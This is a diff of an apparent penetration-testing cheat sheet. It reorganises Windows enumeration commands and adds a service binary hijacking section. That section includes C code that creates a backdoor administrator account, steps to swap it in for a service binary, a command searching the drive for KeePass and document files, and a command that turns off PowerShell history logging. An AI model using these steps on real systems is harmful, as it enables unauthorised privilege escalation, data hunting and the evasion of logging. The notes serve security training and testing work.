@@ -228,52 +228,9 @@ NET USE f: \\ip_kali\nombre_deseado_share /PERSISTENT:YES
 
 ## Windows Enumeration
 
+### Windows Misc Commands
+
 ```
-# Username
-whoami
-
-# Hostname
-hostname
-
-# Group memberships of current user
-whoami /groups
-
-# Other users on the machine
-Get-LocalUser
-net user
-
-# Other groups on the machine
-Get-LocalGroup
-net localgroup
-
-# Members of other groups
-Get-LocalgroupMember <group_name>
-net localgroup <group_name>
-
-# OS, OS Version, Architecture and more
-systeminfo
-
-# Network Configurations
-ipconfig /all
-
-# Routing table
-route print
-
-# List active network connections
-netstat -ano
-
-# List installed applications
-Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname  # 32-bit applications
-Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname # 64-bit applications
-wmic product get name,version
-
-# Running Processes
-Get-Process
-tasklist
-
-# Services
-Get-Service
-
 # Recursively search for files under 'C:\' directory with a specific extension
 Get-ChildItem -Path C:\ -Include *.kdbx,*.ini,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
 
@@ -298,6 +255,130 @@ Get-Content ((Get-PSReadLineOption).HistorySavePath)
 # Prevent PSReadLine from recording commands
 Set-PSReadLineOption -HistorySaveStyle SaveNothing
 
+# Reboot machine (Requires user with SeShutdownPrivilege)
+shutdown /r /t 0
+
+# Start/Stop Service
+net start/stop <service_name>
+Start-Service -NAme <service_name>
+Stop-Service -Name <service_name>
+
+```
+
+[Back to top](#index)
+
+### Users and groups
+
+```
+# Username
+whoami
+
+# Hostname
+hostname
+
+# Group memberships of current user
+whoami /groups
+
+# Other users on the machine
+Get-LocalUser
+net user
+
+# Other groups on the machine
+Get-LocalGroup
+net localgroup
+
+# Members of other groups
+Get-LocalgroupMember <group_name>
+net localgroup <group_name>
+
+```
+[Back to top](#index)
+
+### Os info and Network Config
+
+```
+# OS, OS Version, Architecture and more
+systeminfo
+
+# Network Configurations
+ipconfig /all
+
+# Routing table
+route print
+
+# List active network connections
+netstat -ano
+
+```
+
+[Back to top](#index)
+
+### Installed Software, Services and Process
+
+```
+# List installed applications
+Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname  # 32-bit applications
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname # 64-bit applications
+wmic product get name,version
+Get-WmiObject -Class Win32_Product | Select-Object -Property Name
+Get-AppxPackage ?AllUsers | Select Name, PackageFullName
+
+# Running Processes
+Get-Process
+tasklist
+
+# Services
+Get-Service
+Get-CimInstance -Class win32_service | select Name,State,StartMode,PathName | Where-Object { $_.State -like "Running"}
+Get-CimInstance -Class win32_service | select Name,State,StartMode,PathName | where-object {$_.PathName -notlike "*system32*"} #List only service which binary is not located on system32 folder
+sc.exe query
+Get-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\*
+wmic.exe service get name
+
+```
+
+[Back to top](#index)
+
+### Service Binary Hijacking
+
+Check permissions over the binary
+
+```
+# Get Service Binary Permissions
+Get-ACL 
+icacls "binary.exe"
+
+## Permissions
+- F Full access
+- M Modify access
+- RX Read and execute access
+- R Read-only access
+- W Write-only access
+```
+
+If the binary can be modified, then:
+
+- Compile a malicious binary
+
+ `x86_64-w64-mingw32-gcc maliciousProgram.c -o maliciousBinary.exe`
+
+- Place the binary with the same name and on the same folder as PathName property of the vulnerable service (the folder where the legitimate binary is stored)
+
+ `move maliciousBinary.exe C:\legitimate\binary\folder\<same_binary_name>.exe`
+
+ - Restart the service if possible `restart-service <servcie_name>` or restart the machine `shutdown /r /t 0`
+
+*Malicious binary example code*
+
+```
+#include <stdlib.h>
+int main ()
+{
+	int i;
+	i = system ("net user escalateAsFck DontLookDown123! /add");
+	i = system ("net localgroup administrators escalateAsFck /add");
+	return 0;
+}
 ```
 
 [Back to top](#index)
